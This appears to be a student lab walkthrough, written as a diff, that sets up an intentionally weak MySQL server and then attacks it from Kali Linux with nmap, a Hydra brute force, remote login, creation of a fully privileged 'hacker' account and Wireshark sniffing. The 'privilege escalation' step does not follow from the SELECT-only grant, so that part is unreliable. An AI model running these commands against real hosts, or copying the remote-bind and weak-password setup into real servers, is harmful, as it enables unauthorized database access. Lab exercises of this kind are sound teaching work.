@@ -1,0 +1,55 @@
+##Part 1: Target Setup (MySQL Server with Misconfigurations)
+1. Install MySQL on Target (Ubuntu):
+--->sudo apt update
+---->sudo apt install mysql-server -y
+---->sudo systemctl start mysql
+---->sudo systemctl enable mysql
+
+2. Configure MySQL to Allow Remote Access:
+--->sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
+---->Change bind-address = 127.0.0.1 to:  bind-address = 0.0.0.0
+----> press ctrl o and enter to save and ctrl X to exit
+
+ 3. Add a Weak MySQL User (for Attacker Access):
+----->sudo mysql -u root -p
+---->CREATE USER 'testuser'@'%' IDENTIFIED BY 'test123';
+---->GRANT SELECT ON *.* TO 'testuser'@'%';
+----->FLUSH PRIVILEGES;
+
+4. Allow MySQL Port Through UFW (Optional):
+------>sudo ufw allow 3306/tcp
+------>If not work enable ufw : sudo ufw enable
+------ check status as active:  sudo ufw status numbered
+----->sudo systemctl status mysql
+----->sudo netstat -tuln | grep 3306
+
+
+5.Attacker Side (Kali Linux)
+ 1. Discover Open Ports on Target with Nmap:
+----->nmap -p 3306 192.168.56.104
+
+6. Attempt Brute Force Login (Hydra):
+--->hydra -L userlist.txt -P passlist.txt 192.168.56.104 mysql
+
+to create username and password in mysql
+---->echo "testuser" > userlist.txt
+---->echo "test123" > passlist.txt
+
+7. Login to MySQL from Kali:
+---->mysql -h 192.168.56.104 -u testuser -p
+
+8.Exploit: Create New Privileged User (Privilege Escalation):
+
+---->CREATE USER 'hacker'@'%' IDENTIFIED BY 'hackpass';
+----->GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;
+----->FLUSH PRIVILEGES;
+
+9.Network Sniffing using Wireshark
+--->1. Open Wireshark on Kali:
+------>wireshark
+----->choose eth1
+----->Filter by port:
+----->tcp.port == 3306
+
+10.  Login Again via MySQL Client:
+----->mysql -h 192.168.56.104 -u testuser -p
